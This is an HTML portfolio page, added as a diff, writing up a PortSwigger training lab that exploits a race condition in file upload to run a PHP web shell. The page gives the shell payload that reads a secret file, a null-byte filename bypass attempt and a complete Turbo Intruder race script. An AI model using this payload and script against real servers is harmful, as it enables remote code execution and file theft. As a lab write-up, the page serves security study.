@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 7 — Web Shell Upload via Race Condition — MOSTAFA ELWASEEF's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; white-space: nowrap; flex-shrink: 0; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-critical { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-impossible { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code, li code, td code, h1 code, h2 code, h3 code, blockquote code {
+      background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem;
+    }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); flex: 1 1 auto; min-width: 0; }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+    @media (max-width: 620px) {
+      nav { padding: .65rem 1.25rem; }
+      .hero { padding: 2rem 1.25rem 1.75rem; }
+      .hero h1 { font-size: 1.5rem; }
+      .content { padding: 2rem 1.25rem 3rem; }
+      .cards { grid-template-columns: 1fr; }
+    }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#labs">Labs</a> / <a href="index.html">File Upload Vulnerabilities</a> / Lab 7 — Web Shell Upload via Race Condition</div>
+    <h1>Lab 7 — Web Shell Upload via Race Condition</h1>
+    <div class="meta-row">
+      <span class="badge badge-critical">🟣 Critical</span>
+      <span class="badge badge-date">📅 2026-08-04</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h2 id="finding-summary">📋 Finding Summary</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Type</strong></td><td>Web Shell Upload via Race Condition</td></tr>
+  <tr><td><strong>Severity</strong></td><td>🟣 Critical</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-434</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-08-04</td></tr>
+</table></div>
+<hr>
+<h2 id="description">🔍 Description</h2>
+<p>The application validates uploaded files in the wrong order: it first writes the file to its final location in the web root via <code>move_uploaded_file()</code>, then runs the extension check. If the check fails, the file is deleted with <code>unlink()</code>. This sequence creates a Time-of-Check Time-of-Use (TOCTOU) race window — a brief interval during which the uploaded file exists at its permanent, publicly accessible URL before the server removes it. An attacker who sends concurrent GET requests to that URL during the window can reach the PHP file while it is still present and trigger its execution, bypassing the validation entirely.</p>
+<hr>
+<h2 id="end-goals">🎯 End Goals</h2>
+<ul>
+  <li>Exploit the TOCTOU race window to access an uploaded PHP web shell before the server deletes it</li>
+  <li>Cause the server to execute the embedded PHP payload during the race window</li>
+  <li>Read the contents of <code>/home/carlos/secret</code> and submit the value to solve the lab</li>
+</ul>
+<hr>
+<h2 id="steps-to-reproduce">🪜 Steps to Reproduce</h2>
+<ol>
+  <li>Log in and locate the avatar upload form on the account page.</li>
+  <li>Upload a legitimate PNG image to confirm the upload works and identify the file storage path.</li>
+  <li>Attempt to upload a plain PHP web shell directly to confirm the server validates by extension.</li>
+  <li>Try a null-byte filename bypass (<code>exploit.php%00.png</code>) in Burp Repeater to confirm it does not produce an accessible <code>.php</code> file.</li>
+  <li>Send the POST request to Turbo Intruder and configure a race condition script: <code>request1</code> is the POST upload and <code>request2</code> is a GET to <code>/files/avatars/exploit.php</code>. Queue both under the same gate and call <code>openGate()</code> to fire all requests simultaneously.</li>
+  <li>Run the attack. A concurrent GET hits the file during the race window and returns the PHP output containing the secret. Submit the value to solve the lab.</li>
+</ol>
+<hr>
+<h2 id="analysis">🧠 Analysis</h2>
+<p><strong>Step 1 — Log in and locate the upload form</strong></p>
+<p>Navigated to the lab and logged in as <code>wiener</code>. The <code>/my-account</code> page displayed an avatar upload form with a file browse field. No avatar was currently set.</p>
+<blockquote><em>(Drag 01.png, 02.png here)</em></blockquote>
+<hr>
+<p><strong>Step 2 — Upload a benign image to map the upload directory</strong></p>
+<p>Selected <code>image.jpeg</code> and submitted the avatar form. The server rejected it with “Sorry, only JPG &amp; PNG files are allowed” — the server’s <code>checkFileType()</code> function permits only the <code>.jpg</code> and <code>.png</code> extensions; <code>.jpeg</code> is not in the allowed list. Selected <code>image.png</code> instead and uploaded it. The server responded with “The file avatars/image.png has been uploaded.” and immediately rendered the image as the account avatar. Reviewing the GET <code>/my-account</code> response source in Burp found <code>&lt;img src="/files/avatars/image.png" class="avatar"&gt;</code>, confirming the storage path as <code>/files/avatars/</code>.</p>
+<blockquote><em>(Drag 03.png, 04.png, 05.png, 06.png, 07.png, 08.png, 09.png here)</em></blockquote>
+<hr>
+<p><strong>Step 3 — Attempt direct PHP upload to confirm the validation mechanism</strong></p>
+<p>Created a plain PHP web shell (<code>exploit.php</code>) containing <code>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code> and attempted to upload it as an avatar. The server returned “Sorry, only JPG &amp; PNG files are allowed” with a 403 Forbidden response. Burp confirmed the request with <code>filename="exploit.php"</code> and <code>Content-Type: application/x-php</code> was rejected outright — the <code>.php</code> extension is not in the allowed list and the server does not execute the file before deleting it.</p>
+<blockquote><em>(Drag 10.png, 11.png, 12.png here)</em></blockquote>
+<hr>
+<p><strong>Step 4 — Attempt extension bypass using a null-byte filename</strong></p>
+<p>Captured the exploit.php upload POST in Burp Repeater and tested a null-byte filename bypass (<code>exploit.php%00.png</code>), expecting the server to truncate the name at the null byte and store the file as <code>exploit.php</code>. The POST returned 200 and “The file avatars/exploit.php%00.png has been uploaded”, but a GET to <code>/files/avatars/exploit.php</code> returned 404 — the server stored the file under the literal null-byte filename rather than truncating it, so the file was never accessible at the <code>.php</code> path. The null-byte trick does not work here: for the race condition to succeed, the file must be stored with a <code>.php</code> extension so that Apache serves it through the PHP interpreter during the race window.</p>
+<blockquote><em>(Drag 13.png, 14.png here)</em></blockquote>
+<hr>
+<p><strong>Step 5 — Configure Turbo Intruder for the race condition attack</strong></p>
+<p>Sent the original POST request (with <code>filename="exploit.php"</code>) to Turbo Intruder. Set <code>request1</code> to the full multipart POST to <code>/my-account/avatar</code> carrying the PHP payload, and <code>request2</code> to <code>GET /files/avatars/exploit.php</code>. Wrote the attack script using Turbo Intruder’s gate mechanism to hold the final byte of every queued request until <code>openGate()</code> fires them all at once, minimizing the timing gap between the upload and the retrieval:</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):<br>    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)<br><br>    request1 = '''POST /my-account/avatar HTTP/2<br>Host: &lt;LAB&gt;.web-security-academy.net<br>Cookie: session=&lt;SESSION&gt;<br>Content-Type: multipart/form-data; boundary=&lt;BOUNDARY&gt;<br>...<br>Content-Disposition: form-data; name="avatar"; filename="exploit.php"<br>Content-Type: application/x-php<br><br>&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;<br>...'''<br><br>    request2 = '''GET /files/avatars/exploit.php HTTP/1.1<br>Host: &lt;LAB&gt;.web-security-academy.net<br>Cookie: session=&lt;SESSION&gt;<br><br>'''<br><br>    engine.queue(request1, gate='race1')<br>    for x in range(5):<br>        engine.queue(request2, gate='race1')<br><br>    engine.openGate('race1')<br>    engine.complete(timeout=60)<br><br>def handleResponse(req, interesting):<br>    table.add(req)</code></pre>
+<blockquote><em>(Drag 15.png, 16.png, 17.png here)</em></blockquote>
+<hr>
+<p><strong>Step 6 — Execute the race condition and retrieve the secret</strong></p>
+<p>Clicked Attack. The gate released all queued requests simultaneously — the POST wrote <code>exploit.php</code> to the web root while the five concurrent GET requests hit <code>/files/avatars/exploit.php</code>. All five GETs returned HTTP 200, each executing the PHP payload before <code>unlink()</code> could delete the file. The response body contained the secret <strong><code>9US9vkA05hudtZ853gXKWl9BuGqDDvwr</code></strong>. Submitted <strong><code>9US9vkA05hudtZ853gXKWl9BuGqDDvwr</code></strong> to the lab, which marked it as Solved.</p>
+<blockquote><em>(Drag 18.png, 19.png here)</em></blockquote>
+<hr>
+<h2 id="impact">🎯 Impact</h2>
+<p>An attacker with access to the file upload feature can achieve remote code execution by exploiting the server’s TOCTOU ordering flaw. Because the file is written to the web root before validation runs, a race condition allows PHP execution even though the file is ultimately deleted. This grants the ability to read arbitrary files, enumerate server internals, or escalate to full server compromise depending on the PHP configuration and available functions. Standard extension-based upload restrictions provide no protection when file writes are not atomic with respect to validation.</p>
+<hr>
+<h2 id="references">📚 References</h2>
+<ul>
+  <li><a href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">PortSwigger: File upload vulnerabilities</a></li>
+  <li><a href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">PortSwigger: Race conditions</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noopener">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+</ul>
+<hr>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
